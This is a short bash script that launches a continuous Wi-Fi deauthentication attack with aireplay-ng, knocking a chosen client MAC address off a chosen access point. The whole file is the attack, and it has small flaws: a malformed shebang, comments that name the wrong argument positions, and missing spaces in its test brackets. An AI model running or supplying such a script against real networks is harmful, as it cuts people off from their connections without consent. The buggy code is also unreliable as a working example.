# !/bin/bash
#
# A deauth attack on a specific user on a specific network.
#
# $0 = bssid - Wifi Mac address
# $1 = Victim mac address



if [ -z $1]
then
	echo "Please provide the bssid (wifi mac address)! "

elif [ -z $2]
then
	echo "Please provide the victim mac address!"
else
aireplay-ng -0 0 -a $1 -c $2 wlan0
fi

